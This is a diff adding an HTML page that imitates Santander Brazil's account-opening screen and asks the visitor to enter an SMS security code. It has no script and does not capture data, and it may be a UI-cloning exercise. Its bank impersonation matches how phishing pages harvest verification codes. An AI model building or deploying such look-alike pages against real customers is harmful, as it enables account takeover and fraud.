@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Abra sua conta - Santander</title>
+    <link rel="stylesheet" type="text/css" href="/styles.css">
+</head>
+
+<body>
+    <!-- Header -->
+    <header>
+        <section>
+            <div class="header-onbording">
+                <div class="">
+                    <div>
+                        <img src="https://abrasuaconta.santander.com.br/landing/assets/img/logo/logo-santander-red.svg"
+                            class="img-logo-identificacao" alt="logo santander">
+                    </div>
+                </div>
+            </div>
+            <hr class="line-header" />
+        </section>
+    </header>
+
+    <body>
+        <main>
+            <div class="opf-page">
+                <section class="section-ident">
+                    <div id="indentifica-form" class="form-celular">
+                        <div class="dss-padding">
+                            <div>
+                                <h1 type="h1" class="form-description-1 font-description-ident-1">Vamos validar o código
+                                    de
+                                    segurança enviado</h1>
+                            </div>
+                            <div class="cellphone-info-box">
+                                <img src="/img/iconCelular.JPG" alt="icone celular" width="18%" height="18%">
+                                <p class="">O código foi enviado para o número
+                                </p>
+                            </div>
+                            <div class="cellphone-info-box__label dss-h3">
+                                <h3>(11)*****8522</h3>
+                            </div>
+                            <form class="form-identificacao" action="/Onbording/confirmaNome.html" method="get">
+                                <div class="row ds-form-input">
+                                    <input id="input-text" placeholder="Digite o código" class="dss-form-field_input"
+                                        required>
+                                </div>
+                                <div class="dss-display-flex">
+                                    <p class="dss-text-sm-center">
+                                        Se você não recebeu o código, peça o reenvio em 60 segundos
+                                    </p>
+                                    <button id="reenviarContinuar" type="submit"
+                                        class="dss-button--text dss-button-link   ">
+                                        Continuar
+                                    </button>
+                                    <button class="dss-button--text dss-button-link ">
+                                        Reenviar por Whatsapp
+                                    </button>
+                                </div>
+                            </form>
+                        </div>
+                    </div>
+                </section>
+            </div>
+
+        </main>
+    </body>
+
+</html>
